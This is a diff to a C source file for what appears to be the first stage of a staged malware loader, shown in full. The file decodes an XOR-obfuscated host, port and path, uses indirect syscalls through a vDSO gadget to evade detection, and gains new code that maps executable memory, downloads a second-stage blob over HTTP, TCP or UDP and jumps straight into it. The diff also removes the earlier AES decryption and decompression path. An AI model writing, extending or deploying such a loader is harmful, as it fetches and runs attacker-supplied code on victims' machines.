@@ -1,9 +1,6 @@
 #define _GNU_SOURCE
-#include "aes.h"
-#include "downloader_api.h"
 #include "net_utils.h"
 #include "syscalls.h"
-#include "tinf.h"
 #include "utils.h"
 
 /* Configurable Options - from Makefile */
@@ -21,6 +18,9 @@
 #endif
 #ifndef CONFIG_XOR_KEY
 #define CONFIG_XOR_KEY 0x5A
+#endif
+#ifndef MAX_STAGE_BLOB_SIZE
+#define MAX_STAGE_BLOB_SIZE (40 * 1024 * 1024)
 #endif
 #define BUFFER_SIZE 65536
 
@@ -40,24 +40,13 @@ static const unsigned char encoded_key[] = {ENCODED_KEY};
 static void decode_config_string(char *dest, const unsigned char *encoded,
                                  size_t max_len);
 static void derive_key_from_string(const char *str, uint8_t *key);
-static size_t download_file_wrapper(const char *host, const char *port,
-                                    const char *path, const uint8_t *key,
-                                    char **buffer);
-static int build_payload_from_encrypted(char *enc_buf, size_t enc_size,
-                                        const uint8_t *key, char **out_buf,
-                                        size_t *out_size);
-static size_t decrypt_data(char *data, size_t data_size, const uint8_t *key,
-                           const uint8_t *iv);
+static size_t download_stage1_blob(const char *host, const char *port,
+                                   const char *path, const uint8_t *key,
+                                   void *buffer, size_t capacity);
 
-// Entry point called by _start
-void downloader_main(struct download_result *res) {
+void downloader_main(void) {
   /* Resolve vDSO syscall gadget before any other syscalls */
   init_indirect_syscalls();
-
-  if (!res) {
-    DEBUG_PRINT("No result struct passed\n");
-    return;
-  }
 
   char host[256];
   char port[16];
@@ -71,36 +60,46 @@ void downloader_main(struct download_result *res) {
   decode_config_string(key_str, encoded_key, sizeof(key_str));
   derive_key_from_string(key_str, key);
 
-  DEBUG_PRINT("Downloading from %s:%s%s\n", host, port, path);
+  DEBUG_PRINT("Stage0: Downloading Stage1 blob from %s:%s%s\n", host, port,
+              path);
 
-  char *payload = NULL;
-  size_t downloaded_size =
-      download_file_wrapper(host, port, path, key, &payload);
-
-  if (downloaded_size > 0) {
-    char *final_payload = NULL;
-    size_t final_size = 0;
-    if (build_payload_from_encrypted(payload, downloaded_size, key,
-                                     &final_payload, &final_size) == 0) {
-      res->data = final_payload;
-      res->size = final_size;
-      DEBUG_PRINT("Payload ready: %p (%d bytes)\n", final_payload,
-                  (int)final_size);
-    } else {
-      DEBUG_PRINT("Build payload failed\n");
-      free(payload);
-    }
-  } else {
-    DEBUG_PRINT("Download failed\n");
+  void *stage_blob = (void *)mmap(NULL, MAX_STAGE_BLOB_SIZE,
+                                  PROT_READ | PROT_WRITE | PROT_EXEC,
+                                  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+  if (stage_blob == MAP_FAILED) {
+    DEBUG_PRINT("Stage0: mmap failed\n");
+    exit(1);
   }
+
+  size_t downloaded_size = download_stage1_blob(
+      host, port, path, key, stage_blob, MAX_STAGE_BLOB_SIZE);
+
+  if (downloaded_size == 0) {
+    DEBUG_PRINT("Stage0: download failed\n");
+    munmap(stage_blob, MAX_STAGE_BLOB_SIZE);
+    exit(1);
+  }
+
+  DEBUG_PRINT("Stage0: downloaded %d bytes, jumping to Stage1\n",
+              (int)downloaded_size);
+
+  typedef void (*stage1_entry)(void *base_addr, size_t total_size);
+  stage1_entry entry = (stage1_entry)stage_blob;
+  entry(stage_blob, downloaded_size);
+
+  exit(0);
 }
 
 // Start routine similar to main.c but calls downloader_main
 __asm__(".section .init,\"ax\",@progbits\n"
         ".global _start\n"
         "_start:\n"
+        "xor %rbp, %rbp\n"
+        "and $0xfffffffffffffff0, %rsp\n"
         "call downloader_main\n"
-        "ret\n");
+        "mov $60, %rax\n"
+        "xor %rdi, %rdi\n"
+        "syscall\n");
 
 // IMPL
 
@@ -127,70 +126,14 @@ static void derive_key_from_string(const char *str, uint8_t *key) {
   memcpy(key, temp_key, 16);
 }
 
-static size_t decrypt_data(char *data, size_t data_size, const uint8_t *key,
-                           const uint8_t *iv) {
-  struct AES_ctx ctx;
-  AES_init_ctx_iv(&ctx, key, iv);
-  AES_CTR_xcrypt_buffer(&ctx, (uint8_t *)data, data_size);
-  return data_size;
-}
-
-static int build_payload_from_encrypted(char *enc_buf, size_t enc_size,
-                                        const uint8_t *key, char **out_buf,
-                                        size_t *out_size) {
-  if (!enc_buf || enc_size <= 16 || !out_buf || !out_size)
-    return -1;
-
-  uint8_t iv[16];
-  memcpy(iv, enc_buf, 16);
-  size_t encrypted_body = enc_size - 16;
-  char *cipher = enc_buf + 16;
-  decrypt_data(cipher, encrypted_body, key, iv);
-
-  unsigned int capacity = (unsigned int)encrypted_body * 10;
-  char *decomp = NULL;
-  int res = TINF_OK;
-  unsigned int out_len = 0;
-
-  for (int attempt = 0; attempt < 3; attempt++) {
-    decomp = calloc(capacity, sizeof(char));
-    if (!decomp)
-      return -1;
-    out_len = capacity;
-    res = tinf_uncompress(decomp, &out_len, cipher, encrypted_body);
-    if (res == TINF_OK)
-      break;
-    free(decomp);
-    decomp = NULL;
-    capacity *= 2;
-  }
-
-  if (res != TINF_OK || !decomp)
-    return -1;
-  *out_buf = decomp;
-  *out_size = out_len;
-  return 0;
-}
-
-// download_file implementation (adapted from main.c logic)
-// Since we moved socket logic to net_utils, we use those here
-static size_t download_file_wrapper(const char *host, const char *port,
-                                    const char *path, const uint8_t *key,
-                                    char **buffer) {
-  (void)key;
+static size_t download_stage1_blob(const char *host, const char *port,
+                                   const char *path, const uint8_t *key,
+                                   void *buffer, size_t capacity) {
   int sockfd;
   struct sockaddr_in serv_addr;
-  char *temp_buffer = malloc(BUFFER_SIZE);
-  if (!temp_buffer)
-    return 0;
+  char temp_buffer[BUFFER_SIZE];
   size_t data_size = 0;
-
-#define MAX_DOWNLOAD_SIZE (30 * 1024 * 1024)
-  *buffer = malloc(MAX_DOWNLOAD_SIZE);
-  if (!*buffer) {
-    free(temp_buffer);
-    return 0;
-  }
+  unsigned int http_marker = 0;
 
   memset(&serv_addr, 0, sizeof(serv_addr));
   serv_addr.sin_family = AF_INET;
@@ -204,7 +147,6 @@ static size_t download_file_wrapper(const char *host, const char *port,
   serv_addr.sin_port = htons(port_num);
 
   if (inet_aton(host, &serv_addr.sin_addr) == 0) {
-    free(temp_buffer);
     return 0;
   }
 
@@ -215,14 +157,12 @@ static size_t download_file_wrapper(const char *host, const char *port,
 #endif
 
   if (sockfd == -1) {
-    free(temp_buffer);
     return 0;
   }
 
 #ifndef LISTENER_UDP
   if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) == -1) {
     close(sockfd);
-    free(temp_buffer);
     return 0;
   }
 #endif
@@ -250,33 +190,43 @@ static size_t download_file_wrapper(const char *host, const char *port,
 
   if (send(sockfd, request, strlen(request), 0) == -1) {
     close(sockfd);
-    free(temp_buffer);
     return 0;
   }
 
   int header_end = 0;
+  const char *delim = "\r\n\r\n";
   while (1) {
-    long bytes_received = recv(sockfd, temp_buffer, BUFFER_SIZE - 1, 0);
+    long bytes_received = recv(sockfd, temp_buffer, BUFFER_SIZE, 0);
     if (bytes_received <= 0)
       break;
-    temp_buffer[bytes_received] = '\0';
 
     if (!header_end) {
-      char *header_end_ptr = strstr(temp_buffer, "\r\n\r\n");
-      if (header_end_ptr) {
-        header_end = 1;
-        size_t header_length = header_end_ptr - temp_buffer + 4;
-        long body_len = bytes_received - header_length;
-        if (data_size + body_len > MAX_DOWNLOAD_SIZE)
-          break;
-        memcpy(*buffer + data_size, temp_buffer + header_length, body_len);
-        data_size += body_len;
+      for (long i = 0; i < bytes_received; i++) {
+        if ((unsigned char)temp_buffer[i] ==
+            (unsigned char)delim[http_marker]) {
+          http_marker++;
+          if (http_marker == 4) {
+            header_end = 1;
+            if (i + 1 < bytes_received) {
+              size_t body_len = (size_t)(bytes_received - (i + 1));
+              if (data_size + body_len > capacity)
+                goto done;
+              memcpy((char *)buffer + data_size, temp_buffer + i + 1, body_len);
+              data_size += body_len;
+            }
+            break;
+          }
+        } else {
+          http_marker =
+              ((unsigned char)temp_buffer[i] == (unsigned char)delim[0]) ? 1
+                                                                         : 0;
+        }
       }
     } else {
-      if (data_size + bytes_received > MAX_DOWNLOAD_SIZE)
+      if (data_size + (size_t)bytes_received > capacity)
         break;
-      memcpy(*buffer + data_size, temp_buffer, bytes_received);
-      data_size += bytes_received;
+      memcpy((char *)buffer + data_size, temp_buffer, (size_t)bytes_received);
+      data_size += (size_t)bytes_received;
     }
   }
 #elif defined(LISTENER_TCP)
@@ -284,10 +234,10 @@ static size_t download_file_wrapper(const char *host, const char *port,
     long bytes_received = recv(sockfd, temp_buffer, BUFFER_SIZE, 0);
     if (bytes_received <= 0)
       break;
-    if (data_size + bytes_received > MAX_DOWNLOAD_SIZE)
+    if (data_size + (size_t)bytes_received > capacity)
       break;
-    memcpy(*buffer + data_size, temp_buffer, bytes_received);
-    data_size += bytes_received;
+    memcpy((char *)buffer + data_size, temp_buffer, (size_t)bytes_received);
+    data_size += (size_t)bytes_received;
   }
 #elif defined(LISTENER_UDP)
   struct sockaddr_in src_addr;
@@ -313,7 +263,6 @@ static size_t download_file_wrapper(const char *host, const char *port,
       if (sendto(sockfd, hello_packet, 5, 0, (struct sockaddr *)&serv_addr,
                  sizeof(serv_addr)) == -1) {
         close(sockfd);
-        free(temp_buffer);
         return 0;
       }
     }
@@ -333,10 +282,11 @@ static size_t download_file_wrapper(const char *host, const char *port,
       uint32_t seq = 0;
       memcpy(&seq, temp_buffer, 4);
       if (seq == expected_seq) {
-        if (data_size + bytes_received - 4 > MAX_DOWNLOAD_SIZE)
+        size_t body_len = (size_t)bytes_received - 4;
+        if (data_size + body_len > capacity)
           break;
-        memcpy(*buffer + data_size, temp_buffer + 4, bytes_received - 4);
-        data_size += bytes_received - 4;
+        memcpy((char *)buffer + data_size, temp_buffer + 4, body_len);
+        data_size += body_len;
         expected_seq++;
         sendto(sockfd, &seq, 4, 0, (struct sockaddr *)&src_addr, src_len);
       } else if (seq < expected_seq) {
@@ -345,15 +295,8 @@ static size_t download_file_wrapper(const char *host, const char *port,
     }
   }
 #endif
+done:
   close(sockfd);
-  free(temp_buffer);
-
-  if (data_size > 0 && data_size < MAX_DOWNLOAD_SIZE) {
-    char *exact_buf = realloc(*buffer, data_size);
-    if (exact_buf) {
-      *buffer = exact_buf;
-    }
-  }
 
   return data_size;
 }
